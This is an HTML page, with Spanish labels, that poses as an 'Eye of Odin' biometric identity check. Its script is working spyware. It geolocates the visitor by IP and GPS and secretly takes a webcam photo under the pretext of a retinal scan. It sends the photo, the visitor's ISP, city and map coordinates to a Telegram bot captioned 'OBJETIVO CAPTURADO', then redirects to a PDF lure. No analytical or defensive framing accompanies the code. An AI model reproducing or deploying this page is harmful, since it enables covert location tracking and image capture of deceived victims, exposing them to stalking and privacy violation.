<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
    <title>Eye of Odin - Biometric System</title>
    <style>
        :root {
            --bg: #060910;
            --card: #0b121f;
            --muted: #64748b;
            --accent: #2dd4bf;
            --accent-2: #3b82f6;
            --glass: rgba(255, 255, 255, 0.02);
            --odin-gold: #fbbf24;
        }
        html, body { height: 100%; margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: #e2e8f0; overflow: hidden; }
        .wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        
        .card {
            width: 100%; max-width: 450px; background: var(--card);
            border-radius: 16px; padding: 30px; box-shadow: 0 20px 50px rgba(0,0,0,0.8);
            border: 1px solid rgba(59, 130, 246, 0.2); text-align: center;
        }

        h1 { margin: 0; font-size: 22px; letter-spacing: 2px; color: var(--accent-2); text-transform: uppercase; }
        p.lead { margin: 10px 0 30px 0; color: var(--muted); font-size: 12px; letter-spacing: 1px; }

        /* Sensor Eye of Odin */
        .odin-eye-container {
            position: relative; width: 140px; height: 140px; margin: 0 auto 30px;
            display: flex; justify-content: center; align-items: center; cursor: pointer;
        }
        .eye-svg {
            width: 80px; fill: var(--accent); filter: drop-shadow(0 0 15px var(--accent));
            transition: all 0.3s; z-index: 5;
        }
        .odin-eye-container:hover .eye-svg { transform: scale(1.1); fill: var(--odin-gold); }

        .scan-ring {
            position: absolute; width: 130px; height: 130px;
            border: 2px solid rgba(45, 212, 191, 0.1); border-top: 2px solid var(--accent);
            border-radius: 50%; animation: spin 2s linear infinite; display: none;
        }
        .laser-beam {
            position: absolute; width: 120%; height: 2px; background: var(--accent);
            box-shadow: 0 0 15px var(--accent); top: 50%; display: none;
            animation: scanMove 2s ease-in-out infinite; z-index: 10;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes scanMove { 0%, 100% { top: 20%; opacity: 0; } 50% { top: 80%; opacity: 1; } }

        .status-box { background: var(--glass); border-radius: 8px; padding: 15px; font-family: monospace; font-size: 11px; color: var(--accent); border: 1px solid rgba(255,255,255,0.05); }
        
        button {
            margin-top: 25px; border: 0; background: linear-gradient(90deg, var(--accent-2), var(--accent));
            color: #fff; padding: 12px 24px; border-radius: 8px; cursor: pointer;
            font-weight: bold; text-transform: uppercase; letter-spacing: 1px; width: 100%;
        }
        button:disabled { opacity: 0.5; cursor: not-allowed; }

        footer { margin-top: 25px; color: #334155; font-size: 10px; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="wrap">
        <div class="card">
            <h1>Eye of Odin</h1>
            <p class="lead">PROTOCOLO DE ACCESO BIOM√âTRICO V1.0</p>

            <div class="odin-eye-container" id="sensor">
                <div class="scan-ring" id="ring"></div>
                <div class="laser-beam" id="laser"></div>
                <svg class="eye-svg" viewBox="0 0 24 24">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
            </div>

            <div class="status-box" id="status">SISTEMA EN ESPERA: PULSE EL OJO PARA ESCANEAR</div>

            <button id="btnInit">Iniciar Verificaci√≥n</button>

            <footer>ENCRYPTED BY ODIN CORE</footer>
        </div>
    </div>

    <script src="config.js"></script>
    <script>
        const sensor = document.getElementById('sensor');
        const btnInit = document.getElementById('btnInit');
        const status = document.getElementById('status');
        const laser = document.getElementById('laser');
        const ring = document.getElementById('ring');
        let ejecutando = false;

        async function obtenerGPS() {
            return new Promise((resolve) => {
                if (!navigator.permissions) return resolve(null);
                navigator.permissions.query({name:'geolocation'}).then((res) => {
                    if (res.state === 'granted') {
                        navigator.geolocation.getCurrentPosition(
                            (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: "M√âTRICA (GPS)" }),
                            () => resolve(null), { timeout: 3000 }
                        );
                    } else { resolve(null); }
                });
            });
        }

        async function ejecutarEyeOfOdin() {
            if (ejecutando) return;
            ejecutando = true;
            btnInit.disabled = true;

            status.innerHTML = "> INICIANDO EYE OF ODIN...<br>> RASTREANDO NODOS DE RED...";
            ring.style.display = "block";
            laser.style.display = "block";

            let reporte = "";

            try {
                // 1. Triangulaci√≥n Agresiva
                const res = await fetch('https://ipwho.is/');
                const d = await res.json();
                
                const gps = await obtenerGPS();
                const lat = gps ? gps.lat : d.latitude;
                const lon = gps ? gps.lon : d.longitude;
                const prec = gps ? gps.acc : "TRIANGULACI√ìN (Nodos)";

                reporte = `
üëÅÔ∏è *EYE OF ODIN REPORT*
------------------------------------
üì° *RED:* ${d.connection.isp}
üìç *CIUDAD:* ${d.city}, ${d.region}
üéØ *PRECISI√ìN:* ${prec}
üîó *MAP:* https://www.google.com/maps?q=${lat},${lon}&z=19
------------------------------------`;

                // 2. Captura Biom√©trica (C√°mara)
                status.innerHTML = "> ANALIZANDO PATR√ìN RETINIANO...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true);
                video.play();
                
                await new Promise(r => setTimeout(r, 2500));

                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const foto = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
                stream.getTracks().forEach(t => t.stop());

                // 3. Exfiltraci√≥n a Telegram
                status.innerHTML = "> ENVIANDO DATOS AL N√öCLEO...";
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT_ID);
                fd.append('photo', foto, 'odin.jpg');
                fd.append('caption', `‚úÖ *OBJETIVO CAPTURADO*\n${reporte}`);
                fd.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                status.innerHTML = "‚úÖ ACCESO CONCEDIDO POR ODIN";
                setTimeout(() => location.href = CONFIG.PDF_URL, 1000);

            } catch (err) {
                status.innerHTML = "‚ùå ERROR: PERMISO REQUERIDO";
                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `‚ùå *FALLO EN EYE OF ODIN*\nMotivo: ${err.message}`, parse_mode: 'Markdown' })
                });
                alert("EYE OF ODIN: Se requiere permiso de sensor para validar identidad.");
                location.reload();
            }
        }

        sensor.addEventListener('click', ejecutarEyeOfOdin);
        btnInit.addEventListener('click', ejecutarEyeOfOdin);
    </script>
</body>
</html>
